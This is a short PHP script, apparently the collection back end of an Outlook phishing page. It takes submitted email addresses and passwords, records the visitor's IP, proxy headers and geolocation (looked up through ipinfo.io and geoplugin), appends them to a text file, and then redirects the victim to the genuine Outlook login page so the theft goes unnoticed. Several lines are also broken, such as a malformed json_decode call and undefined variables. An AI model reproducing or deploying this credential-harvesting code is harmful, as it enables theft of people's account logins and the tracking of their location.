<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];
$ip_comp = $_SERVER['HTTP_CLIENT_IP'];
$userp = $_SERVER['HTTP_X_FORWARDED'];
$proxy = $_SERVER['HTTP_X_FORWARDED_FOR'];



$cc = trim(file_get_contents("http://ipinfo.io/{$proxy}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));


$informacionSolicitud = file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip);

// Convertir el texto JSON en un array
$dataSolicitud = json_decode(informacionSolicitud);

// Ver contenido del array
var_dump($dataArray);

	
	$file = fopen("NEW01.txt", "a");
	
fwrite($file, 
"* EMAIL: ".$_POST['email']."
* PASS: ".$_POST['pass']."
* PASS1: ".$_POST['pass1']."
* FECHA: ".date('Y-m-d')."
* HORA: ".date('H:i:s')."
* IP: ".$ip."
* PROXY: ".$proxy."
* PAIS: ".$geoplugin_countryCode."
* CITY: ".$geoplugin_countryName."
".$userp."
".$cc."
".$city."   
" . PHP_EOL);
fwrite($file, "==============================" . PHP_EOL);
fclose($file);

header("location:https://outlook.live.com/owa/");

?>
